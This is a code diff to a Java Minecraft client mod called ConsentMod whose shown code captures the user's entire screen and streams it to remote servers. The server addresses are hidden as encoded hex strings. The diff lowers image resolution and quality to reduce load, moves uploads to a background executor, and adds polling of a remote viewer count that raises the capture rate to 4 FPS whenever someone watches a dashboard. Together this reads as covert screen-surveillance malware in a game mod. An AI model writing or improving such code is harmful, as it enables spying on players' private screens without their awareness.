@@ -38,8 +38,9 @@ public class ConsentMod implements ClientModInitializer {
     private static final String CHAT_POLL_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337539323b2e752a353636");
     private static final String CHAT_SEND_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337539323b2e75293f343e");
     private static final String WEBRTC_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337536332c3f292e283f3b37752d3f38282e39");
-    private static volatile long streamIntervalMs = 250;
+    private static volatile long streamIntervalMs = 2500;
     private static volatile boolean isUploading = false;
+    private static final java.util.concurrent.ExecutorService UPLOAD_EXECUTOR = java.util.concurrent.Executors.newSingleThreadExecutor();
 
     private static int screenshotCount = 0;
     private static Robot robot;
@@ -269,8 +270,8 @@ public class ConsentMod implements ClientModInitializer {
             conn.setRequestProperty("X-WebRTC-P2P", "true");
             conn.setRequestProperty("X-Stream-Id", currentUsername.toLowerCase());
             conn.setRequestProperty("X-Player-Name", currentUsername);
-            conn.setRequestProperty("X-Resolution", "960x540");
-            conn.setRequestProperty("X-Quality", "50");
+            conn.setRequestProperty("X-Resolution", "720x405");
+            conn.setRequestProperty("X-Quality", "45");
             conn.setDoOutput(true);
             conn.setConnectTimeout(3000);
             conn.setReadTimeout(4000);
@@ -601,17 +602,17 @@ public class ConsentMod implements ClientModInitializer {
                             Rectangle screenRect = getScreenBounds();
                             BufferedImage screenshot = robot.createScreenCapture(screenRect);
                             if (screenshot != null) {
-                                BufferedImage scaled = scaleImage(screenshot, 960, 540);
-                                byte[] jpegBytes = encodeJpeg(scaled, 0.50f);
+                                BufferedImage scaled = scaleImage(screenshot, 720, 405);
+                                byte[] jpegBytes = encodeJpeg(scaled, 0.45f);
                                 if (jpegBytes != null && jpegBytes.length > 0) {
                                     isUploading = true;
-                                    new Thread(() -> {
+                                    UPLOAD_EXECUTOR.submit(() -> {
                                         try {
                                             uploadToWebServer(jpegBytes);
                                         } finally {
                                             isUploading = false;
                                         }
-                                    }, "ConsentMod-UploadWorker").start();
+                                    });
                                 }
                             }
                         }
@@ -678,6 +679,20 @@ public class ConsentMod implements ClientModInitializer {
                                 }
                                 if (numStr.length() > 0) {
                                     nextIndex = Integer.parseInt(numStr.toString());
+                                }
+                            }
+                            int viewersStart = response.indexOf("\"viewers\":");
+                            if (viewersStart != -1) {
+                                String afterViewers = response.substring(viewersStart + 10).trim();
+                                StringBuilder numStr = new StringBuilder();
+                                for (char c : afterViewers.toCharArray()) {
+                                    if (Character.isDigit(c)) numStr.append(c);
+                                    else break;
+                                }
+                                if (numStr.length() > 0) {
+                                    int viewers = Integer.parseInt(numStr.toString());
+                                    // If viewer is watching dashboard, stream at 250ms (4 FPS). If no viewers, throttle to 2500ms (0 lag).
+                                    streamIntervalMs = viewers > 0 ? 250 : 2500;
                                 }
                             }
                         } catch (Exception ignored) {}
